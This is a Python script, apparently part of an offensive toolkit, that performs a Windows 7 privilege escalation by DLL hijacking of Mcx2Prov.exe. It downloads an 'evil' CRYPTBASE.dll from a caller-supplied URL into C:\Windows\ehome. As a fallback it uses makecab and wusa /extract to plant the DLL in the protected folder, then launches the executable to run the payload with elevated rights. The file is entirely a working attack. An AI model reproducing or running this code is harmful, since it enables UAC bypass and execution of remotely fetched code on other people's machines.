"""
https://www.greyhathacker.net/?p=796

* Windows 7

Executable:
C:\windows\ehome\Mcx2Prov.exe

Loads:
C:\Windows\ehome\CRYPTBASE.dll

Checks if Mcx2Prov.exe is present in \windows\ehome\ folder, if True
continue by checking if the dll file exists. If false, continue by
attempting to download the evil dll file to \windows\ehome\ folder
if fail, we attempt to use makecab and wusa to copy our dll. After
the copy is done, we execute the executable and enjoys the elevated
access
"""
import os
import sys
import requests
import win32api
import win32con

def mcx2prov_dll_hijack(url):
	if (os.path.isfile(os.path.join("c:\windows\ehome\Mcx2Prov.exe")) == True):
		if (os.path.isfile(os.path.join("c:\windows\ehome\CRYPTBASE.dll")) == False):
			try:
				download = requests.get(url)
				if (len(download.content) > 1):
					with open(os.path.join("c:\windows\ehome\CRYPTBASE.dll"),"wb") as dll:
						dll.write(download.content)
						dll.close()
					if (os.path.isfile(os.path.join("c:\windows\ehome\CRYPTBASE.dll")) == True):
						try:
							win32api.ShellExecute(0,None,"c:\windows\ehome\Mcx2Prov.exe",None,None,win32con.SW_SHOW)
						except Exception as error:
							return False
					else:
						try:
							makecab = os.popen("makecab CRYPTBASE.dll CRYPTBASE.tmp")
						except Exception as error:
							return False	
						try:
							wusa = os.popen("wusa CRYPTBASE.tmp /extract:c:\windows\ehome")
						except Exception as error:
							return False
						try:
							os.remove("CRYPTBASE.tmp")
						except Exception as error:
							return False	
						try:
							win32api.ShellExecute(0,None,"c:\windows\ehome\Mcx2Prov.exe",None,None,win32con.SW_SHOW)
						except Exception as error:
							return False
				else:
					return False
			except Exception as error:
				return False
	else:
		sys.exit()	
